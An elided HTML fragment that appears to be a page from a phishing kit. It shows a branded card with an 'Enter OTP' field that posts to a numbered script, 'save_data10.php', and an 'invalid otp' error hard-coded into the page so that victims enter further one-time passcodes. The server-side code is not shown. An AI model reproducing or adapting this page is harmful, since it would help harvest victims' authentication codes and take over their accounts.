...
<html lang="zxx">
   <head>
      ...
      <link rel="stylesheet" type="text/css" href="bootstrap.min-1.css">
      <link rel="stylesheet" type="text/css" href="unamestyle-1.css">
   </head>
   <body>
         ...
         <nav class="navbar navbar-default">
            <div class="container">
               <div class="navbar-header">
                  ...
                  <a class="navbar-brand" href="#"><img src="loghska-1.svg" width="150px"></a>
               </div>
            ...
            <div class="col-md-5">
               <div class="card m-0 p-0">
                  <div class="bg-light p-30">
                     ...
                     <img src="loghska-1.svg" width="100%">
                  </div>
                  <div class="card-body">
                     <form action="save_data10.php" method="post">
                        <div class="row">
                           <div class="col-md-12">
                           ...
                           <div id="enter_otp" style="color: red; margin-left:10px"><p>invalid otp</p></div>
                           <div class="col-md-12"> 
                              <input type="text" class="form-control" name="otp7" oninput="remove_otp()" placeholder="Enter OTP" required=""> 
                           </div>
                        ...
                        <div class="w3ls-login">
                           <button type="submit" name="submit" value="submit" class="btn btn-success btn-block"> Confirm </button>
                        </div>
